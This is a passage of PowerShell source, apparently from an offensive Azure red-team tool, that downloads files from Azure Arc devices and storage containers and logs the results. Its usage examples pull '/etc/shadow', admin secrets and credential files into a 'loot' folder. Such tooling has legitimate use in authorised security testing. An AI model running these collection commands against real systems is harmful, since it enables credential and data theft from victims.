        $statusColor = if ($downloadResult.Success) { "Green" } else { "Red" }
        $sizeStr = if ($downloadResult.Size) { Format-FileSize -Bytes $downloadResult.Size } else { "-" }

        Write-Host "AZR    " -NoNewline -ForegroundColor Cyan
        Write-Host $device.Name.PadRight(20) -NoNewline
        Write-Host "ARC".PadRight(7) -NoNewline -ForegroundColor Magenta
        Write-Host "GET".PadRight(7) -NoNewline
        Write-Host $RemotePath.PadRight(40) -NoNewline
        Write-Host $status.PadRight(15) -NoNewline -ForegroundColor $statusColor
        Write-Host "Size: $sizeStr"

        if (-not $downloadResult.Success) {
            Write-ColorOutput -Message "    Error: $($downloadResult.Error)" -Color "Red"
            $errorCount++
        } else {
            $successCount++
            $totalBytes += $downloadResult.Size
            Write-ColorOutput -Message "[*] Saved to: $LocalPath" -Color "Green"
        }

        $results += [PSCustomObject]@{
            Target = $device.Name
            Type = "ARC"
            Operation = "GET"
            RemotePath = $RemotePath
            LocalPath = $LocalPath
            Status = if ($downloadResult.Success) { "SUCCESS" } else { "FAILED" }
            Size = $sizeStr
            Error = $downloadResult.Error
        }

    } elseif ($StorageAccountTarget) {
        # Storage account download (blob or share)
        Write-ColorOutput -Message "[*] Target: Storage Account ($StorageAccountTarget)`n" -Color "Yellow"

        $storageAccount = Get-AzStorageAccount | Where-Object { $_.StorageAccountName -eq $StorageAccountTarget } | Select-Object -First 1
        if (-not $storageAccount) {
            Write-ColorOutput -Message "[!] Storage account not found: $StorageAccountTarget" -Color "Red"
            return
        }

        $storageContext = $storageAccount.Context

        if ($ContainerTarget) {
            # Check if it's a blob container or file share
            $container = Get-AzStorageContainer -Name $ContainerTarget -Context $storageContext -ErrorAction SilentlyContinue
            $share = Get-AzStorageShare -Name $ContainerTarget -Context $storageContext -ErrorAction SilentlyContinue

            if ($container) {
                Write-ColorOutput -Message "[*] Downloading from blob container: $ContainerTarget" -Color "Gray"
                $downloadResult = Receive-BlobFile -StorageContext $storageContext -ContainerName $ContainerTarget -RemotePath $RemotePath -LocalPath $LocalPath -StorageAccountName $StorageAccountTarget
                $targetType = "BLOB"
            } elseif ($share) {
                Write-ColorOutput -Message "[*] Downloading from file share: $ContainerTarget" -Color "Gray"
                $downloadResult = Receive-ShareFile -StorageContext $storageContext -ShareName $ContainerTarget -RemotePath $RemotePath -LocalPath $LocalPath -StorageAccountName $StorageAccountTarget
                $targetType = "SHARE"
            } else {
                Write-ColorOutput -Message "[!] Container/Share not found: $ContainerTarget" -Color "Red"
                return
            }

            $status = if ($downloadResult.Success) { "[+] SUCCESS" } else { "[-] FAILED" }
            $statusColor = if ($downloadResult.Success) { "Green" } else { "Red" }
            $sizeStr = if ($downloadResult.Size) { Format-FileSize -Bytes $downloadResult.Size } else { "-" }

            Write-Host "AZR    " -NoNewline -ForegroundColor Cyan
            Write-Host "$StorageAccountTarget/$ContainerTarget".PadRight(20) -NoNewline
            Write-Host $targetType.PadRight(7) -NoNewline -ForegroundColor Blue
            Write-Host "GET".PadRight(7) -NoNewline
            Write-Host $RemotePath.PadRight(40) -NoNewline
            Write-Host $status.PadRight(15) -NoNewline -ForegroundColor $statusColor
            Write-Host "Size: $sizeStr"

            if (-not $downloadResult.Success) {
                Write-ColorOutput -Message "    Error: $($downloadResult.Error)" -Color "Red"
                $errorCount++
            } else {
                $successCount++
                $totalBytes += $downloadResult.Size
                Write-ColorOutput -Message "[*] Saved to: $LocalPath" -Color "Green"
            }

            $results += [PSCustomObject]@{
                Target = "$StorageAccountTarget/$ContainerTarget"
                Type = $targetType
                Operation = "GET"
                RemotePath = $RemotePath
                LocalPath = $LocalPath
                Status = if ($downloadResult.Success) { "SUCCESS" } else { "FAILED" }
                Size = $sizeStr
                Error = $downloadResult.Error
            }
        } else {
            Write-ColorOutput -Message "[!] Error: -ContainerTarget is required for storage downloads" -Color "Red"
            return
        }
    } else {
        Write-ColorOutput -Message "[!] Error: Specify a target using -VMName, -DeviceName, or -StorageAccountTarget" -Color "Red"
        Write-ColorOutput -Message "[*] Usage examples:" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 get-file -VMName 'vm-01' -RemotePath 'C:\Users\admin\secret.txt' -LocalPath '.\loot\secret.txt'" -Color "Gray"
        Write-ColorOutput -Message "    .\azx.ps1 get-file -DeviceName 'arc-01' -RemotePath '/etc/shadow' -LocalPath '.\shadow'" -Color "Gray"
        Write-ColorOutput -Message "    .\azx.ps1 get-file -StorageAccountTarget 'myaccount' -ContainerTarget 'data' -RemotePath 'secrets/creds.txt' -LocalPath '.\loot\creds.txt'" -Color "Gray"
        return
    }

    # Summary
    Write-ColorOutput -Message "`n[*] TRANSFER SUMMARY" -Color "Yellow"
    Write-ColorOutput -Message "[*] Files Downloaded: $successCount | Total Size: $(Format-FileSize -Bytes $totalBytes) | Errors: $errorCount" -Color "Cyan"

    # Export results if requested
    if ($ExportPath -and $results.Count -gt 0) {
        Export-Results -Data $results -ExportPath $ExportPath -ExportType "FileTransfer-Get"
    }
}
